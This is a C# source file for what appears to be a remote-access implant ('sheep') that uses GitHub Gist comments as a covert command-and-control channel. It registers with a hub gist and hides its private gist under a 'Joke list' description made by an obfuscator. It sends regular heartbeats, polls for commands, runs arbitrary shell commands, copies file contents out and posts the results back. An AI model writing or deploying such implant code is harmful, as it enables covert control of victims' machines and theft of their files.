using Octokit;
using Pasture;
using Pasture.Messages;

namespace Sheep.Core;

/// <summary>
/// Class <c>SheepController</c> Sheep main controller
/// </summary>
public class SheepController
{
    private GitHubClient _client;
    private GistComment? _startingComment;
    private string? _gistId;

    private Timer _heartBeatTimer;

    private const string HubGistId = "<HUB_GIST_ID>";
    private const string GithubToken = "<GITHUB_TOKEN>";

    public string SheepId { get; private set; }

    private IDictionary<int, GistComment> _processedComments = new Dictionary<int, GistComment>();

    public SheepController(string sheepId)
    {
        SheepId = sheepId;
        _client = ConnectGitHubClient();
    }
    
    /// <summary>
    /// Method <c>ConnectGitHubClient</c> Handles connection to Github API.
    /// </summary>
    private GitHubClient ConnectGitHubClient()
    {
        var client = new GitHubClient(new ProductHeaderValue($"sheep"));
        var tokenAuth =
            new Credentials(GithubToken);
        client.Credentials = tokenAuth;

        return client;
    }

    /// <summary>
    /// Method <c>SendHeartBeat</c> Sends heartbeat message to the gist.
    /// </summary>
    private void SendHeartBeat(object? state)
    {
        var message = new HeartBeatMessage(DateTimeOffset.UtcNow);
        _client.Gist.Comment.Create(_gistId, message.GetTransportFormat());
    }

    /// <summary>
    /// Method <c>Start</c> Starts the control gist flow.
    /// </summary>
    public async Task Start()
    {
        //Try to find existing hub gist
        var comments = await _client.Gist.Comment.GetAllForGist(HubGistId, new ApiOptions(){PageSize = 100, PageCount = 100});

        foreach (var comment in comments)
        {
            if (AssignmentMessage.TryParse(comment.Body, out var assignmentMessage) &&
                assignmentMessage.SheepId == SheepId)
            {
                _gistId = assignmentMessage.GistId;

                _heartBeatTimer = new Timer(SendHeartBeat, null, 0, 1000 * 60 * 15);
                return;
            }
        }

        //Create new gist if not existing
        var newGist = new NewGist()
        {
            Public = false,
            Description = $"Joke list id: {SheepId}"
        };
        newGist.Files.Add(Obfuscator.RandomGistName(), Obfuscator.RandomGistDescription());

        var gist = await _client.Gist.Create(newGist);
        _gistId = gist.Id;

        _startingComment =
            await _client.Gist.Comment.Create(HubGistId,
                new AssignmentMessage(SheepId, _gistId).GetTransportFormat());

        _heartBeatTimer = new Timer(SendHeartBeat, null, 0, 1000 * 60 * 15);
    }
    
    /// <summary>
    /// Method <c>TryReceiveMessage</c> Tries to receive and process not yet processed message
    /// </summary>
    public async Task TryReceiveMessage()
    {
        var comments = await _client.Gist.Comment.GetAllForGist(_gistId, new ApiOptions(){PageSize = 100, PageCount = 100});

        foreach (var comment in comments)
        {
            if (CommandMessage.TryParse(comment.Body, out var commandMessage) && !commandMessage.Answered)
            {
                await ProcessMessageAndRespond(commandMessage, comment.Id);
            }
        }
    }

    /// <summary>
    /// Method <c>ProcessMessage</c> Process receive message and respond
    /// </summary>
    private async Task ProcessMessageAndRespond(CommandMessage commandMessage, int commentId)
    {
        string response;
        ResponseMessage responseMessage;

        switch (commandMessage.Type)
        {
            case CommandType.W:
                response = await CommandExecutor.ExecuteCommandW();
                responseMessage = new ResponseMessage(commentId, commandMessage.Type, response);
                await _client.Gist.Comment.Create(_gistId, responseMessage.GetTransportFormat());
                break;
            case CommandType.Ls:
                response = await CommandExecutor.ExecuteCommandLs(commandMessage.Parameters);
                responseMessage = new ResponseMessage(commentId, commandMessage.Type, response);
                await _client.Gist.Comment.Create(_gistId, responseMessage.GetTransportFormat());
                break;
            case CommandType.Id:
                response = await CommandExecutor.ExecuteCommandId();
                responseMessage = new ResponseMessage(commentId, commandMessage.Type, response);
                await _client.Gist.Comment.Create(_gistId, responseMessage.GetTransportFormat());
                break;
            case CommandType.Cp:
                var filePath = commandMessage.Parameters;
                int pos = filePath.LastIndexOf("/", StringComparison.Ordinal) + 1;
                var fileName = filePath.Substring(pos, filePath.Length - pos);
                var fileContent = await CommandExecutor.ExecuteCommandCopy(filePath);

                responseMessage = new ResponseMessage(commentId, commandMessage.Type, fileContent);
                await _client.Gist.Comment.Create(_gistId, responseMessage.GetTransportFormat());
                break;
            case CommandType.Execute:
                response = await CommandExecutor.ExecuteCommand(commandMessage.Parameters);
                responseMessage = new ResponseMessage(commentId, commandMessage.Type, response);
                await _client.Gist.Comment.Create(_gistId, responseMessage.GetTransportFormat());
                break;
            default:
                throw new ArgumentOutOfRangeException();
        }

        commandMessage.Answered = true;
        await _client.Gist.Comment.Update(_gistId, commentId, commandMessage.GetTransportFormat());
    }
}